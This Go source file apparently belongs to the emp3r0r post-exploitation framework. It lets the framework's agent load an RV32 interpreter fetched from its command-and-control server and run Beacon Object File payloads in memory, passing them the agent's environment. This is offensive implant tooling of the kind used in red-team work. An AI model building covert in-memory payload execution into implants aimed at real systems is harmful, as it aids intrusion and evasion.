package rvvm

import (
	"errors"
	"fmt"
	"os"
	"runtime"
	"sync"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
	"github.com/jm33-m0/emp3r0r/core/lib/memdeps"
	"github.com/jm33-m0/emp3r0r/core/lib/memmod"
)

// dependencyName is the module that provides the RV32IMA interpreter. The C2
// hosts it as <name>.<arch>.gz; the agent maps it on demand.
func dependencyName() string { return "rvvm_linux" }

// maxGuestOutput bounds the C string read back from the interpreter so a
// corrupted return value cannot make the agent scan unmapped memory forever.
const maxGuestOutput = (8 << 20) + 16

// bofArgs mirrors struct rv_bof_args in
// core/c_agent/include/rvvm_abi.h: the packed COFF argument buffer and the
// NUL-separated environment block. Pointers are machine words, so the layout
// matches on 32- and 64-bit hosts.
type bofArgs struct {
	Buf    unsafe.Pointer
	Len    uintptr
	Env    unsafe.Pointer
	EnvLen uintptr
}

// runMu serializes interpreter runs. The module keeps per-image state in
// file-scope variables and its ABI allows one call at a time; memdeps maps a
// fresh image for every use, and the lock keeps that contract independent of
// the resolver's caching.
var runMu sync.Mutex

// RunRiscvBof executes a portable BOF. The payload is a static RV32 musl
// executable; the interpreter starts at musl _start and the guest entry shim
// calls the BOF.
func RunRiscvBof(payload []byte, args []coffloader.CoffArg, opts ...memdeps.UseOption) (string, error) {
	if err := checkPlatform(); err != nil {
		return "", err
	}
	runMu.Lock()
	defer runMu.Unlock()
	if len(payload) == 0 {
		return "", errors.New("empty payload")
	}
	packed, err := coffloader.PackCoffArgs(args)
	if err != nil {
		return "", fmt.Errorf("pack BOF arguments: %w", err)
	}
	wire, err := coffloader.PackLinuxArgs(packed)
	if err != nil {
		return "", fmt.Errorf("pack BOF wire arguments: %w", err)
	}
	if wire == nil {
		// No COFF arguments still need the uint32 body-length prefix that
		// BeaconDataParse expects.
		wire = []byte{0, 0, 0, 0}
	}

	// The interpreter runs guest code on the calling OS thread; pin the
	// goroutine so the mapped image and its stack stay on one thread.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// The guest sees the agent environment, like a native BOF.
	env := make([]byte, 0, 1024)
	for _, kv := range os.Environ() {
		env = append(env, kv...)
		env = append(env, 0)
	}

	var out string
	err = memdeps.Use(dependencyName(), func(module *memmod.Module) error {
		var bofPtr unsafe.Pointer
		if len(wire) > 0 {
			bofPtr = unsafe.Pointer(&wire[0])
		}
		var envPtr unsafe.Pointer
		if len(env) > 0 {
			envPtr = unsafe.Pointer(&env[0])
		}
		// Heap-allocate the argument descriptor: the interpreter dereferences
		// its fields, and a goroutine stack can move.
		desc := &bofArgs{
			Buf:    bofPtr,
			Len:    uintptr(len(wire)),
			Env:    envPtr,
			EnvLen: uintptr(len(env)),
		}

		result, callErr := callRun(module,
			uintptr(unsafe.Pointer(&payload[0])),
			uintptr(len(payload)),
			uintptr(unsafe.Pointer(desc)),
		)
		if callErr != nil {
			return callErr
		}
		runtime.KeepAlive(payload)
		runtime.KeepAlive(wire)
		runtime.KeepAlive(env)
		runtime.KeepAlive(desc)

		if result == 0 {
			if msg := callLastError(module); msg != "" {
				return fmt.Errorf("%s", msg)
			}
			return errors.New("guest run failed")
		}

		out = readCString(result)
		// Let the interpreter release the buffer while its code is still
		// mapped.
		callFree(module, result)
		return nil
	}, opts...)
	return out, err
}

// readCString reads a NUL-terminated string from mapped memory.
func readCString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	buf := make([]byte, 0, 64)
	for i := uintptr(0); i < maxGuestOutput; i++ {
		b := *(*byte)(unsafe.Pointer(ptr + i))
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}
